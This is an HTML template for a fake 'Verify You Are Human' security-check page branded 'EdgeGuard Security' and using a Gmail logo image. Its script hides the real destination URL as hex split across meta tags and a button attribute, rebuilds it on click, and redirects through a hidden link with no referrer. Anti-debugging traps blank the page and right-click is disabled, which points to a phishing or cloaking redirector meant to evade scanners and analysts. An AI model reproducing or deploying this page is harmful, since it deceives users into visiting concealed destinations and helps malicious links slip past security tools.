<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <meta property="og:title" content="Security Verification">
    <meta property="og:description" content="Verifying connection security parameters. Please wait...">
    <meta property="og:image" content="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_server_1x.png">
    <meta property="og:site_name" content="EdgeGuard Security">
    <meta name="theme-color" content="#4a90e2">
    <meta name="build-id" content="{{ p1 }}">
    <meta name="csrf-token" content="{{ p2 }}">
    <title>Security Check</title>
    <style nonce="{{ nonce }}">
        html, body {
            height: 100%;
            width: 100%;
            margin: 0;
            padding: 0;
            background-color: #1a1a1a;
            color: #d8d8d8;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            user-select: none;
        }
        #{{ ids.container }} {
            background: #2d2d2d;
            border: 1px solid #3d3d3d;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        h2 { font-size: 20px; font-weight: 500; margin-bottom: 10px; color: #fff; }
        p { font-size: 14px; color: #999; margin-bottom: 25px; }
        #{{ ids.button }} {
            background: #4a90e2;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
        }
        #{{ ids.button }}:hover { background: #357abd; }
        .spinner {
            border: 3px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top: 3px solid #4a90e2;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body oncontextmenu="return false;">
    <div id="{{ ids.container }}">
        <h2>Site Security</h2>
        <p>Checking your browser before accessing the destination.</p>
        <button id="{{ ids.button }}" data-verify="{{ p3 }}" onclick="process()">
            Verify You Are Human
        </button>
    </div>
    <script nonce="{{ nonce }}">
        setInterval(function(){
            var startTime = performance.now();
            debugger; 
            if (performance.now() - startTime > 100) {
                document.body.innerHTML = "Security Violation.";
            }
        }, 500);

        function process() {
            var btn = document.getElementById("{{ ids.button }}");
            btn.innerHTML = '<div class="spinner"></div> Verifying...';
            btn.style.cursor = "wait";
            
            setTimeout(function() {
                try {
                    var m1 = document.querySelector('meta[name="build-id"]').getAttribute('content');
                    var m2 = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
                    var m3 = btn.getAttribute('data-verify');
                    var hex = m1 + m2 + m3;
                    var url = '';
                    for (var i = 0; i < hex.length; i += 2) {
                        url += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
                    }
                    var link = document.createElement('a');
                    link.href = url;
                    link.rel = "noreferrer";
                    link.style.display = 'none';
                    document.body.appendChild(link);
                    link.click();
                } catch (e) {
                }
            }, 800);
        }
    </script>
</body>
</html>
